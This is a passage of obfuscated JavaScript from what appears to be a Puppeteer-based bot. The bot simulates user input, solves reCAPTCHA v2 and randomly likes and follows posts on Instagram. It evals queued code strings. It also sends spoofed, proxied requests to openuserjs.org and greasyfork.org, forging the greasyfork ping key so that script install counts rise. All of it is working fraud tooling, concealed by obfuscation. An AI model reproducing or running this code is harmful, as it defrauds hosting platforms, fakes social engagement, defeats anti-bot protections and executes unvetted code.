                    const aa = a2['shift']();
                    Check['ia'](aa, Page, Frame);
                    const ab = a2['shift']();
                    Check['nes'](ab),
                    isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20pruning\x20t' + 'echniques\x20' + 'failed\x20in\x20' + 'stype:', ab, aa, a9, a2),
                    log('[debug]\x20in' + '\x20to\x20find:', aa, ab, ...a2);
                    const ac = await I(aa, ab, ...a2);
                    log('[debug]\x20fo' + 'und\x20elemen' + 't', ac),
                    await J(Z, ac, a9, 0xc2b + -0x31d * 0x1 + -0x90d);
                  }
                  break;
                case 'solveV2':
                  {
                    const ad = a2[-0x2b * -0x59 + -0x1 * 0x2261 + -0x9b7 * -0x2];
                    Check['ia'](ad, Page, Frame),
                    await Z['solveRecap' + 'tchaV2'](ad);
                  }
                  break;
                case 'sclick':
                  {
                    const ae = a2['shift'](),
                      af = a2['shift']();
                    (ae instanceof Page || ae instanceof Frame) && 'string' == typeof af && isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20arg\x20check' + '\x20failed\x20in' + '\x20sclick:', a2),
                    await K(Z, [
                      'stype',
                      '_click',
                      ae,
                      af,
                      ...a2
                    ]);
                  }
                  break;
                case 'sclick-nav':
                  {
                    const [ag] = a2;
                    Check['ia'](ag, Page, Frame);
                    const ah = ag['waitForNav' + 'igation']();
                    await K(Z, [
                      'sclick',
                      ...a2
                    ]),
                    await ah;
                  }
                  break;
                case 'view':
                  {
                    const ai = a2['shift'](),
                      aj = a2['shift']();
                    (ai instanceof Page || ai instanceof Frame) && 'string' == typeof aj && isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20arg\x20check' + '\x20failed\x20in' + '\x20view:', a2),
                    await K(Z, [
                      'stype',
                      '_view',
                      ai,
                      aj,
                      ...a2
                    ]);
                  }
                  break;
                case 'randomdown':
                  {
                    let [ak, al] = a2;
                    Check['num'](ak),
                    Check['num'](al),
                    al ? ? = -0x22b9 + -0x2306 + 0xdf3 * 0x5 + 0.3;
                    for (let am = ak; am-- && (await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowDown'), !(random() <= al));)
                      await H();
                  }
                  break;
                case 'enter-nav':
                  {
                    const [an] = a2;
                    Check['ia'](an, Page, Frame);
                    const ao = an['waitForNav' + 'igation']();
                    await K(Z, 'enter'),
                    await ao;
                  }
                  break;
                case 'click':
                  {
                    const [ap, aq, ar] = a2;
                    if ('string' != typeof ap || ![
                        aT(0x15, 'Y2]1'),
                        'string'
                      ]['includes'](typeof aq) || !(ar instanceof Page || ar instanceof Frame))
                      return void warn('[WATCHDOG]' + '\x20Failed\x20ar' + 'gument\x20che' + 'ck', a2);
                    await Z['clickSelec' + 'tor'](ap, aq, ar);
                  }
                  break;
                case 'ifclick':
                  {
                    const [as, au, av] = a2;
                    'string' == typeof as && [
                      'boolean',
                      'string'
                    ]['includes'](au) && (av instanceof Page || av instanceof Frame) || warn('[WATCHDOG]' + '\x20Failed\x20ar' + 'gument\x20che' + 'ck', a2);
                    let aw = await av['$'](as);
                    aw && await Z['clickSelec' + 'tor'](as, au, av);
                    try {
                      aw ? .['dispose'] ? .();
                    } catch (ax) {}
                  }
                  break;
                default:
                  warn('No\x20action\x20' + 'found\x20for\x20' + a1[-0xda4 + -0x77 * -0x4f + -0x1715]);
              }
            } else {
              const ay = a1['split'](',\x20');
              await H(), flags['debug'] && log('[DEBUG]\x20Ex' + 'ecuting\x20sc' + 'riptlet\x20ty' + 'pe:', ay);
              let az = 0x163d + 0x10bb + 0x158 * -0x1d;
              for (let aA of ay) {
                switch (flags['debug'] && log('[SNIP' + az++ + (']\x20Executin' + 'g\x20step:\x20[') + aA + ']'), aA) {
                  case 'j':
                    await H();
                    break;
                  case 'tab':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Tab');
                    break;
                  case 'enter':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Enter');
                    break;
                  case 'down':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowDown');
                    break;
                  case 'up':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowUp');
                    break;
                  case 'space':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Space');
                    break;
                  case 'esc':
                  case 'escape':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Escape');
                    break;
                  default:
                    warn('[WATCHDOG]' + '\x20Failed\x20cm' + 'd\x20catch', aA, ay);
                }
                await H();
              }
            }
          return -0xf1 * -0xb + 0x211c + -0x2b76;
        }
        async function L(Z) {
          return Check['inst'](Z, Page), await Z['keyboard']['down']('ArrowDown'), await wait(getRandomInt(0x11dd + -0x31 * 0x11 + -0xc44, -0xc97 + -0x1 * -0x22 + -0x1c5 * -0xd)), await Z['keyboard']['up']('ArrowDown'), await wait(getRandomInt(0x6eb * -0x2 + -0x504 + 0x6 * 0x3cb, 0x19c0 + 0x1534 * -0x1 + -0x8 * -0x1a1)), 0xf29 * -0x1 + 0x1370 * -0x2 + 0x1b05 * 0x2;
        }
        let M = -0x2d * -0xab + 0x167 * 0x15 + -0x3b82;

        function N(Z = 'none') {
          return 'sadjqwdwkq' + 'dwqxzc' + sha1(++M + ('sadjqwdwkq' + 'dwq') + Z);
        }
        async function O(Z, a0) {
          Check['func'](Z), Check['inst'](a0, Page);
          const a1 = N();
          await a0['evaluate'](a2 => {
            let a3 = [...document['querySelec' + 'torAll']('svg')]['find'](a4 => a4['innerHTML']['includes']('<title>Lik' + 'e</title>') && 'Like' === a4['getAttribu' + 'te']('aria-label') && window['__toolkit']['smartEleme' + 'ntVisible'](a4));
            a3 && a3['classList']['add'](a2);
          }, a1), await Z(a0['browser'](), [
            'ifclick',
            '.' + a1, -0x1f12 + 0x37e * 0x5 + 0x55 * 0x29,
            a0
          ]);
        }
        async function P(Z, a0) {
          const a1 = N();
          await a0['evaluate'](a2 => {
            const aU = b;
            let a3 = [...document[aU(0x6, ']YGN') + 'torAll']('div')]['find'](a5 => 'Follow' === a5['innerText'] && window['__toolkit']['smartEleme' + 'ntVisible'](a5)),
              a4 = a3['className']['baseVal'];
            a3['className']['baseVal'] += ('' === a4 ? '' : '\x20') + a2;
          }, a1), await Z(a0['browser'](), [
            'ifclick',
            '.' + a1, -0x1 * 0x24a1 + 0x2fb * 0x6 + 0x12c0,
            a0
          ]);
        }
        async function Q(Z) {
          await Z['goto']('https://ww' + 'w.instagra' + 'm.com/', gotoOpts), await Z['waitForFun' + 'ction'](() => {
            try {
              return document['querySelec' + 'torAll']('article')['length'] > 0x2610 + -0x1b6 + -0x2459 * 0x1;
            } catch (a0) {
              return -0xe * 0x7e + 0xb4f + -0x179 * 0x3;
            }
          });
        }
        async function R(Z) {
          await Z['keyboard']['down']('ArrowDown'), await wait(getRandomInt(-0xc00 * -0x1 + -0x2532 + 0x1b8a, -0xb34 + -0x21d * -0x7 + 0x1 * 0x6f5)), await Z['keyboard']['up']('ArrowDown'), await wait(getRandomInt(-0x379 * -0x1 + 0x1ec7 * 0x1 + 0x3cb * -0x8, 0x67a + -0x577 * -0x6 + -0x15b0)), getRandomInt(0x333 * 0x7 + -0x98a + -0xcda, 0x180b * -0x1 + -0xf05 + 0x271a) <= -0xb1a * -0x3 + -0x22 * 0x11b + 0x44f && await O(K, Z), getRandomInt(0x64d * -0x2 + -0xe3 * 0x4 + -0x1 * -0x1027, 0x16b4 + 0x16a1 + 0x3 * -0xefb) <= -0x12bf * -0x1 + -0x131c + 0x80 * 0x1 && await P(K, Z);
        }
        async function S(Z) {
          return await Z['evaluate'](() => {
            window['__toolkit'] = {
              'isElementVisible' (a0) {
                try {
                  return null !== a0['offsetPare' + 'nt'];
                } catch (a1) {
                  return 0xb17 + 0x2c1 * -0x4 + -0x13 * 0x1;
                }
              },
              'smartElementVisible' (a0) {
                try {
                  if (!a0 || !a0['getClientR' + 'ects']()['length'])
                    return -0x197 + -0x2 * 0x5e7 + 0xd65;
                  const a1 = getComputedStyle(a0);
                  if ('none' === a1['display'] || 'hidden' === a1['visibility'] || '0' === a1['opacity'])
                    return 0x41b * -0x3 + -0x5fc * 0x6 + 0x3039;
                  const a2 = a0['getBoundin' + 'gClientRec' + 't']();
                  return a2['top'] >= -0x1d0 * -0xe + -0xfe + -0x1862 && a2['left'] >= -0x1554 * 0x1 + 0x1f56 + -0xa02 && a2['bottom'] <= (window['innerHeigh' + 't'] || document['documentEl' + 'ement']['clientHeig' + 'ht']) && a2['right'] <= (window['innerWidth'] || document['documentEl' + 'ement']['clientWidt' + 'h']) ? -0x149c + 0x1e15 * 0x1 + -0x65 * 0x18 : -0x3 * -0x3 + -0x1ad * -0x16 + -0x24e7;
                } catch (a3) {
                  return 0x210d + -0x1 * -0xf40 + -0x304d;
                }
              },
              'extractLinks' (a0) {
                const a1 = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
                let a2, a3 = [];
                for (; null !== (a2 = a1['exec'](a0));)
                  a2['index'] === a1['lastIndex'] && a1['lastIndex']++, a2['forEach']((a4, a5) => {
                    -0x1f43 + 0x142b + 0xb19 === a5 && a3['push'](a4);
                  });
                return a3;
              }
            };
          });
        }
        log('browser\x20la' + 'unched');
        let T = -0x5 * -0x59c + -0x4ed + -0x171f;
        const U = V['length'],
          V = [
            async function() {
              const Z = await x('https://ww' + 'w.youtube.' + 'com/');
              let a0 = 0x106b + -0xb * -0x223 + 0x2 * -0x13f6;
              if (await Z['goto'](data['mediumArti' + 'cles']['random'](), {
                  'timeout': NETWORK_PATIENCE
                })['catch'](a1 => a0++), !a0) {
                await randomWait();
                for (let a1 = 0xcf + 0x1 * 0x7af + -0x43f * 0x2; a1 < getRandomInt(-0x8 * 0x408 + -0x8b * 0x1 + 0x20cc, 0x199 * 0x3 + 0x205 + -0x6cb); a1++)
                  await q['simKeyboar' + 'dPress']('ArrowDown'), await randomWait();
                await randomWait(), await wait(0x24 * -0x6da + 0x1 * 0x5660 + 0x18aa8), await Z['close']();
              }
            },
            async function() {
              const Z = await x('https://ww' + 'w.youtube.' + 'com/');
              let a0 = 0xca3 + 0x12a + -0x1 * 0xdcd;
              const a1 = getRandomInt(-0x1 * 0x15a9 + -0x11 * -0x218 + -0xdea, 0x7 * -0x429 + 0x8ea + 0x1442);
              for (; a0 < a1;) {
                try {
                  await y(Z), await G['random']()(Z);
                } catch (a2) {
                  log(a2), await Z['goto']('https://ww' + 'w.youtube.' + 'com/');
                }
                a0++;
              }
              return await Z['close'](), -0xe3f + -0x1a3a * -0x1 + -0xbfa;
            }
          ];
        for (;;) {
          try {
            const Z = f['length'] ? f['shift']() : V[T++ % U];
            'string' == typeof Z ? g = await eval(Z) : await Z();
          } catch (a0) {}
          await wait(0x13f4 + 0x190f * 0x1 + -0x1 * 0x291b);
        }
      }
      if (flags['doCreateSe' + 'rver'] && require('http')['createServ' + 'er'](async function(a1, a2) {
          '/latestev' === a1['url'] ? (a2['writeHead'](0x1 * 0x8c9 + -0x39 + 0xc * -0xa6), a2['end']('$' === g ? g : '$' + g)) : (a2['writeHead'](0x1fb5 * -0x1 + 0x1700 + -0x97d * -0x1), a2['write']('v0.8'), a2['end']());
        })['listen'](process['env']['PORT'] || 0x3 * -0x1b5 + -0x2261 * -0x1 + 0x5 * 0x76), flags['doOUJS']) {
        const a1 = 'https://op' + 'enuserjs.o' + 'rg/';

        function a2(a5, a6 = 0x7b8 + -0x2 * -0x45f + -0x1075) {
          const aV = c;
          if (a5['includes']('Firefox'))
            return a5['slice'](a5['indexOf']('Firefox') + 'Firefox' [aV(0x2a)] + (-0x1 * -0x9d6 + -0xfd1 + -0x4 * -0x17f));
          const a7 = a5['indexOf']('Chrome/') + 'Chrome/' ['length'],
            a8 = a5['slice'](a7),
            a9 = a8['slice'](0x20cc + -0x42c + -0x1ca0, a8['indexOf']('\x20'));
          return a6 ? a9['slice'](0x1d3 * -0x6 + -0xa82 + 0x1574, a9['indexOf']('.')) : a9;
        }

        function a3() {
          const a5 = data['oujsUAs']['random']();
          return [
            a5,
            a5['includes']('Firefox')
          ];
        }
        async function a4() {
          const aX = d,
            aW = b,
            a5 = data['oujsToAssi' + 'st']['random'](),
            a6 = a5['replace']('/scripts/', '/install/') + '.user.js',
            [a7, a8] = a3(),
            a9 = a2(a7),
            aa = {
              'signal': AbortSignal['timeout'](-0x119 * 0x19 + -0x4bb5 + 0x471b * 0x2),
              'headers': {
                'host': 'openuserjs' + '.org',
                'origin': 'https://op' + 'enuserjs.o' + 'rg',
                'user-agent': a7,
                'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
                'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
                'accept-language': 'en-US,en;q' + '=0.9',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': aW(0xa, 'zhCz') + 'n',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1'
              },
              'body': null,
              'method': 'GET'
            };
          a8 ? Object['assign'](aa['headers'], {
            'te': 'trailers'
          }) : Object['assign'](aa['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          });
          const ab = await fetch(a1, aa)['catch'](ae => {});
          if (!ab || !ab['headers'])
            return;
          if (null === ab['headers']['get']('X-RateLimi' + 't-Limit'))
            return;
          const ac = {
            'signal': AbortSignal['timeout'](0x1997 * -0x2 + -0x2023 * 0x1 + 0x7a61),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': a7,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': aX(0xe),
              'referer': a1,
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
          if (a8 ? Object['assign'](ac['headers'], {
              'te': 'trailers'
            }) : Object['assign'](ac['headers'], {
              'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': '\x22Windows\x22'
            }), !await fetch(a5, ac)['catch'](ae => {}))
            return;
          const ad = {
            'headers': {
              'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'none'
            },
            'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
            'body': null,
            'method': 'GET'
          };
          a8 ? Object['assign'](ad['headers'], {
            'te': 'trailers'
          }) : Object['assign'](ad['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), await fetch(a6, ad);
        }
        a4();
        for (let a5 = -0xb4c * -0x3 + -0x20df + -0x105; a5 < 0x76 * -0x31 + 0x1d4d + -0x6b3; a5++)
          setTimeout(a4, (0x51e3 * 0x2 + -0xe11b + 0x11 * 0x1165) * a5 * getRandomInt(-0x5 * -0x239 + 0x3 * -0x72e + 0xa6e, 0xce * -0xb + -0x1928 + -0x3 * -0xb57));
        setInterval(() => {
          a4();
          for (let a6 = 0x625 + 0x15bf + 0x69 * -0x44; a6 < -0x4 * -0x6e9 + -0x106 * 0x12 + -0x934; a6++)
            setTimeout(a4, (-0x2 * 0x9539 + 0x1c23f + -0x5293 * -0x1) * a6 * getRandomInt(0xc * -0x304 + -0x56 * 0x4f + -0x12f * -0x35, -0x23a1 + 0x1ecd + 0x15 * 0x3b));
        }, 0x1 * 0x55c3fd + 0x223c27 * -0x1 + 0x366aa);
      }
      if (flags['doGF']) {
        async function a6(a8 = null, a9 = -0x9d7 * -0x2 + 0x6cc + -0x1 * 0x1a7a) {
          const aY = d,
            aa = makeFetchCookie(fetch),
            ab = a8 ? new HttpsProxyAgent(a8) : a8,
            ac = await aa('https://gr' + 'easyfork.o' + 'rg/en', {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site'
              },
              'method': 'GET',
              'mode': 'cors',
              'agent': ab
            }),
            ad = extractLinks(await ac['text']())['filter'](al => al['includes']('by-site'))['slice'](-0x9dc + 0xaeb + -0x10f * 0x1, -(-0x256d + 0x158c + -0x1 * -0xfe2)),
            ae = a9 && data['scriptTarg' + 'ets']['random'](),
            af = a9 ? ae['preRef'] : ad['random'](),
            ag = await aa(af, {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origi' + 'n',
                'Sec-Fetch-User': '?1'
              },
              'referrer': 'https://gr' + 'easyfork.o' + 'rg/en',
              'method': 'GET',
              'mode': 'cors',
              'agent': ab
            }),
            ah = extractLinks(await ag['text']())['filter'](al => al['includes']('/scripts/') && !al['includes']('by-site'))['slice'](-0x26bb * -0x1 + 0x2025 + -0x46df * 0x1),
            ai = a9 ? ae['url'] : ah['random'](),
            aj = await aa(ai, {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origi' + 'n',
                'Sec-Fetch-User': '?1'
              },
              'referrer': af,
              'method': 'GET',
              'mode': 'cors',
              'agent': ab
            }),
            ak = extractAnchorData(await aj['text']());
          if (ak['pingUrl']) {
            const al = sha1(ak['ipAddress'] + ak['scriptId'] + ak['pingKey']),
              am = ak['pingUrl'] + (ak['pingUrl']['includes']('?') ? '&' : '?') + 'ping_key=' + encodeURIComponent(al);
            await aa('https://gr' + 'easyfork.o' + 'rg' + am + '&mo=3', {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': aY(0x0),
                'Sec-Fetch-Site': 'same-origi' + 'n'
              },
              'referrer': ai,
              'method': 'POST',
              'mode': 'cors',
              'agent': ab
            });
          } else
            warn('awdiwajdwj' + 'qdqw');
        }
        async function a7() {
          const a8 = await getRandomProxy();
          await a6(a8, -0x1517 * -0x1 + 0x1fe3 + -0x34fa), random() <= 0x2524 * 0x1 + 0x109 + -0x262d + 0.6 && await a6(a8, 0x2 * 0xd5b + -0x2 * -0x1198 + 0x3de5 * -0x1);
        }
        a7();
        for (let a8 = 0xaf9 * 0x3 + -0x25b1 + -0x2f * -0x1a; a8 < 0x61f * -0x1 + -0x23c3 + -0x29e6 * -0x1; a8++)
          setTimeout(a7, (0x100f + -0x5 * 0x1ee3 + 0x174c0) * a8 * getRandomInt(-0x1dc4 + 0xdd3 + 0xff2 * 0x1, 0x1198 + 0x34b + 0x20 * -0xa7));
        setInterval(() => {
          a7();
          for (let a9 = -0x7b2 + 0x1 * -0x2674 + -0x1 * -0x2e26; a9 < -0x109f + -0x247 + 0x12ea; a9++)
            setTimeout(a7, (0x77 * -0x1 + 0x15350 + -0x6879) * a9 * getRandomInt(0x3ee * -0x4 + -0x754 + 0x1 * 0x170d, 0x1 * 0x47b + 0xbfc + -0x1074));
        }, -0x257 * 0x6711 + -0x1 * -0x2dc47bc + 0x1 * -0x6a9975);
      }
    } catch (a9) {
      warn(a9);
    }
    break;
  }
}();